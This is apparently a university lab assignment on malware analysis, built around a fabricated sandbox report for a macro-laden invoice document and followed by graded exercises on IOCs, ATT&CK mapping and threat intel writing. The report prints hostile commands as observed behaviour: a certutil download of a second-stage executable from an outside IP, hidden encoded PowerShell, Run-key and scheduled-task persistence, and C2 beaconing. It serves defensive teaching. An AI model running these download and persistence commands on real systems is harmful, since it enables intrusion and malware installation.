# Lab Activity: Module 07 - Malware Analysis Fundamentals

## Course: CIS-4332 Cyber Analyst | Texas Wesleyan University

## Instructor: Professor Nash

## CySA+ CS0-003 Domain: Domain 1 - Security Operations (33%)

---

## Lab Overview

In this lab you will analyze a simulated sandbox report for a malware sample, extract indicators of compromise, map behaviors to MITRE ATT&CK techniques, and produce an analyst threat intelligence summary. All data is provided within this document. No sandbox software or malware samples are required.

Total Points: 100

Estimated Completion Time: 75-90 minutes

Submission: Upload your completed Lab Report to the Canvas Module 07 Lab assignment.

---

## Learning Objectives

By completing this lab you will be able to:

- Extract file, network, host, and behavioral IOCs from a sandbox analysis report
- Map observed malware behaviors to MITRE ATT&CK tactics and techniques
- Classify a malware sample by type based on behavioral evidence
- Assess sandbox evasion indicators in an analysis report
- Write a structured threat intelligence summary suitable for SIEM rule creation and threat hunting

---

## Scenario Context

Your organization's email security gateway flagged an attachment named `invoice_Q4_2024.docm` received by an accounts payable employee. The attachment was intercepted before the employee opened it. The file was submitted to the organization's sandboxing platform for detonation. The sandbox executed the sample in a Windows 10 environment for 300 seconds and generated the report below. Your task is to analyze this report and complete all four exercises.

---

## Sandbox Report: invoice_Q4_2024.docm

### Report Header

```text
Sample Name:       invoice_Q4_2024.docm
File Type:         Microsoft Office Open XML Macro-Enabled Document
SHA-256:           7c4e8f2a1b5d9e3c6f0a4b7e2d8c1f5a9b3e7c0d4f8a2b6e1c5d9f3a7b0e4c
MD5:               d41f5c8a2b9e3c7f1a4d6b8e0c2f5a9b
File Size:         847,204 bytes
Threat Score:      96/100 (MALICIOUS)
Verdict:           MALICIOUS — High confidence

Analysis Duration: 300 seconds
Environment:       Windows 10 22H2 (x64), Office 365, No AV
```

### Static Analysis Results

```text
STRINGS EXTRACTED (selected high-value findings):

  Line 142:  http://198.51.100.47/msupd/stage2.exe
  Line 143:  http://198.51.100.47/msupd/config.enc
  Line 218:  powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand
  Line 219:  JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0
  Line 347:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  Line 348:  WindowsUpdateHelper
  Line 412:  C:\Users\Public\WindowsUpdateHelper.exe
  Line 501:  WinUpdate-{A3F5B2C1-D4E6-A7B8-C9D0-E1F2A3B4C5D6}
  Line 587:  updates.microsoft-patch-cdn.com
  Line 601:  svchost32.exe

MACRO ANALYSIS:
  Contains VBA macro code: YES
  Auto-execute trigger: Document_Open()
  Obfuscation: String concatenation and Chr() encoding used to build command string
  Macro action: Launches PowerShell via Shell() command with encoded argument
```

### Dynamic Analysis Results

#### Process Tree

```text
[00:02]  WINWORD.EXE (PID 1024)  [User: analyst]
    |
    +-- [00:04]  cmd.exe (PID 1188)
            |
            +-- [00:05]  powershell.exe (PID 1344)
            |       CommandLine: powershell.exe -NoProfile -NonInteractive
            |                   -WindowStyle Hidden
            |                   -EncodedCommand JABjAGwAaQBlAG4Ad...
            |
            +-- [00:18]  certutil.exe (PID 1512)
            |       CommandLine: certutil.exe -urlcache -f
            |                   http://198.51.100.47/msupd/stage2.exe
            |                   C:\Users\Public\WindowsUpdateHelper.exe
            |
            +-- [00:21]  WindowsUpdateHelper.exe (PID 1601)
                    |   Path: C:\Users\Public\WindowsUpdateHelper.exe
                    |   SHA-256: 7c4e8f2a1b5d9e3c6f0a4b7e2d8c1f5a9b3e7c0d4f8a2b6e1c5d9f3a7b0e4c
                    |   Note: Hash matches invoice_Q4_2024.docm dropper
                    |
                    +-- [00:23]  schtasks.exe (PID 1712)
                    |       CommandLine: schtasks /Create /SC ONLOGON
                    |                   /TN "WindowsUpdateHelper"
                    |                   /TR "C:\Users\Public\WindowsUpdateHelper.exe"
                    |                   /RU analyst
                    |
                    +-- [00:24]  reg.exe (PID 1714)
                    |       CommandLine: reg add
                    |                   "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
                    |                   /v WindowsUpdateHelper
                    |                   /t REG_SZ
                    |                   /d "C:\Users\Public\WindowsUpdateHelper.exe"
                    |
                    +-- [00:31]  whoami.exe (PID 1801)
                    +-- [00:32]  systeminfo.exe (PID 1803)
                    +-- [00:33]  ipconfig.exe (PID 1805)  [/all]
                    +-- [00:34]  net.exe (PID 1807)  [user]
                    +-- [00:35]  net.exe (PID 1809)  [localgroup administrators]
                    +-- [00:36]  arp.exe (PID 1811)  [-a]
                    +-- [00:37]  tasklist.exe (PID 1813)
```

#### Network Activity Log

```text
[00:19]  DNS QUERY: updates.microsoft-patch-cdn.com
         Response: NXDOMAIN (domain does not resolve)

[00:21]  TCP CONNECT: 198.51.100.47:4444 [ESTABLISHED]
         Process: WindowsUpdateHelper.exe (PID 1601)

[00:21]  HTTP GET: http://198.51.100.47/msupd/config.enc
         Process: WindowsUpdateHelper.exe (PID 1601)
         Response: 200 OK, 14,220 bytes

[00:22]  DNS QUERY: updates.microsoft-patch-cdn.com
         Response: NXDOMAIN

[00:22]  TCP CONNECT: 198.51.100.47:443 [ESTABLISHED]
         Process: WindowsUpdateHelper.exe (PID 1601)

[00:60]  BEACON: TCP to 198.51.100.47:4444
         Interval: approximately 60 seconds (observed 4 consecutive beacons)
         Process: WindowsUpdateHelper.exe (PID 1601)
```

#### File System Activity

```text
[00:18]  FILE CREATE: C:\Users\Public\WindowsUpdateHelper.exe
         SHA-256: 7c4e8f2a1b5d9e3c6f0a4b7e2d8c1f5a9b3e7c0d4f8a2b6e1c5d9f3a7b0e4c
         Actor: certutil.exe (PID 1512)

[00:21]  FILE CREATE: C:\Users\Public\config.dat
         Size: 14,220 bytes (matches downloaded config.enc)
         Actor: WindowsUpdateHelper.exe (PID 1601)

[00:25]  FILE CREATE: C:\Users\analyst\AppData\Local\Temp\~tmp4A7F.dat
         Size: 2,048 bytes
         Actor: WindowsUpdateHelper.exe (PID 1601)
         Note: File deleted at timestamp 00:27
```

#### Registry Activity

```text
[00:24]  REGISTRY WRITE:
         Key:   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
         Value: WindowsUpdateHelper
         Data:  C:\Users\Public\WindowsUpdateHelper.exe
         Actor: reg.exe (PID 1714)

[00:25]  REGISTRY WRITE:
         Key:   HKCU\Software\WindowsUpdateHelper
         Value: ConfigPath
         Data:  C:\Users\Public\config.dat
         Actor: WindowsUpdateHelper.exe (PID 1601)
```

#### API Call Log

```text
[00:21]  CreateMutex("WinUpdate-{A3F5B2C1-D4E6-A7B8-C9D0-E1F2A3B4C5D6}")
         Process: WindowsUpdateHelper.exe

[00:21]  VirtualAlloc(size=4096, flProtect=PAGE_EXECUTE_READWRITE)
         Process: WindowsUpdateHelper.exe

[00:21]  CreateRemoteThread(target=explorer.exe)
         Process: WindowsUpdateHelper.exe

[00:22]  WriteProcessMemory(target=explorer.exe, size=4096)
         Process: WindowsUpdateHelper.exe

[00:31]  GetSystemInfo()
[00:32]  GetAdaptersInfo()
[00:33]  NetUserEnum()
```

#### Sandbox Evasion Observations

```text
[00:01]  Sample queried: HKLM\SOFTWARE\VMware, Inc.\VMware Tools
         Result: Key not found (sandbox does not expose this key)

[00:01]  Sample queried: Win32_ComputerSystem.TotalPhysicalMemory
         Result: 4 GB returned (below typical sandbox minimum; no evasion triggered)

[00:02]  Sample queried: GetTickCount()
         Result: 14 minutes uptime returned (above 3-minute evasion threshold)
         Malware proceeded to execute.

[00:04]  Sample checked for mouse movement history
         Result: Sandbox simulation active — movement history present
         Malware proceeded to execute.
```

---

## Exercise 1: IOC Extraction (30 points)

### Task 1A — Complete IOC Table (20 points)

Using the sandbox report, complete a full IOC table. For each IOC identified, provide the IOC value, the IOC type (file hash, IP address, domain, URL, registry key, file path, mutex, or scheduled task name), the source section of the report it came from, and the recommended detection action (SIEM rule, EDR hunt, DNS sinkhole, firewall block, etc.).

You must identify a minimum of 12 distinct IOCs. The grader will award 1.5 points for each correctly documented IOC with all four fields completed, up to 20 points. Partial credit is available for entries missing one field.

### Task 1B — IOC Priority Ranking (10 points)

From your completed IOC table, select the five IOCs you consider highest priority for immediate defensive action. In 4-5 sentences, justify your selection. Address which IOCs are unique to this malware versus generic, which would have the broadest detection coverage, and which provide the highest confidence of a true positive.

---

## Exercise 2: ATT&CK Technique Mapping (30 points)

### Task 2A — Process Tree Annotation (15 points)

For each of the five suspicious process events listed below, identify the ATT&CK technique it represents (name and technique ID) and in 2-3 sentences explain what the attacker accomplished at this step. Use the Reading Guide ATT&CK mapping table as your reference.

Scoring: 3 points per entry — 1 point for correct ATT&CK technique ID, 2 points for accurate explanation.

Entry 1: WINWORD.EXE spawning cmd.exe at timestamp 00:04

Entry 2: powershell.exe with -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand at 00:05

Entry 3: certutil.exe with -urlcache -f arguments downloading from 198.51.100.47 at 00:18

Entry 4: schtasks.exe creating task "WindowsUpdateHelper" at 00:23

Entry 5: The discovery sequence (whoami, systeminfo, ipconfig, net user, net localgroup, arp, tasklist) from 00:31 to 00:37

### Task 2B — Full ATT&CK Tactic Sequence (15 points)

In 6-8 sentences, describe the complete attack chain from initial access through post-compromise activity, mapping each phase to an ATT&CK tactic in chronological order. Your answer must:

1. Identify the initial access vector
2. Name each ATT&CK tactic in the sequence
3. Identify at least one specific technique ID per tactic phase
4. Explain why this attack chain is likely to evade traditional antivirus

---

## Exercise 3: Malware Classification and Capability Assessment (25 points)

### Task 3A — Malware Type Classification (10 points)

Based on the sandbox report, classify the malware type and justify your classification in 5-6 sentences. Your answer must:

1. State the most accurate malware classification from the Reading Guide categories
2. Identify at least three specific behavioral indicators from the report that support your classification
3. Explain whether this sample exhibits any capabilities from a second malware category, and if so which category and why

### Task 3B — Capability Assessment (15 points)

In 6-8 sentences, assess the full capability set demonstrated by this malware sample. Address the following:

1. What persistence mechanisms did the malware establish and how many layers of persistence does it use?
2. What does the API call log reveal about planned post-persistence activity?
3. What does the beacon interval behavior suggest about the C2 communication design?
4. What does the config.enc download suggest about the malware's operational architecture?

---

## Exercise 4: Sandbox Evasion Analysis and Threat Intelligence Summary (15 points)

### Task 4A — Sandbox Evasion Analysis (7 points)

Review the Sandbox Evasion Observations section of the report. In 4-5 sentences, answer the following:

1. What four sandbox environment checks did the malware perform?
2. Which checks returned values that could have triggered evasion?
3. What does the fact that the malware ultimately proceeded to execute tell you about its evasion threshold configuration?

### Task 4B — Threat Intelligence Summary (8 points)

Write a structured threat intelligence summary for this sample, suitable for distribution to your SOC team and entry into your threat intelligence platform. Your summary must include the following labeled sections:

Sample Identification: name, hash, file type

Threat Classification: malware type, threat level

ATT&CK Technique Summary: list all technique IDs identified

Network IOCs: all C2 IPs, domains, ports

Host IOCs: file paths, hashes, registry keys, scheduled task names, mutex

Recommended Detection Actions: at minimum one SIEM rule description, one EDR hunt query description, one DNS action

TLP Marking: state the TLP level and justify your choice

---

## Grading Rubric

| Exercise | Points | Grading Criteria |
|---|---|---|
| Exercise 1A — IOC Extraction Table | 20 | 1.5 pts per correct IOC (minimum 12 required); all four fields must be present |
| Exercise 1B — IOC Priority Ranking | 10 | Logical prioritization; uniqueness and detection breadth addressed |
| Exercise 2A — Process Tree Annotation | 15 | 3 pts per entry; technique ID correct + accurate explanation |
| Exercise 2B — ATT&CK Tactic Sequence | 15 | All tactics named; technique IDs cited; AV evasion addressed |
| Exercise 3A — Malware Classification | 10 | Correct type; three behavioral indicators; secondary capability noted if applicable |
| Exercise 3B — Capability Assessment | 15 | Persistence layers; API call interpretation; beacon analysis; architecture inference |
| Exercise 4A — Evasion Analysis | 7 | Four checks identified; correct threshold interpretation |
| Exercise 4B — Threat Intel Summary | 8 | All required sections present; correct TLP; actionable detection recommendations |
| Total | 100 | |

---

## Submission Instructions

1. Use the Lab Report Template from Canvas or a clearly labeled document matching this lab's section structure.
2. Include your full name, student ID, course section, and submission date.
3. Present IOC tables using a formatted table or clearly organized list.
4. Submit to the Canvas Module 07 Lab assignment by the posted deadline.

---

## Academic Integrity Notice

All sandbox report data in this lab is fabricated for educational purposes. All work must be your own. Reference professormesser.com and comptia.org for additional study context.
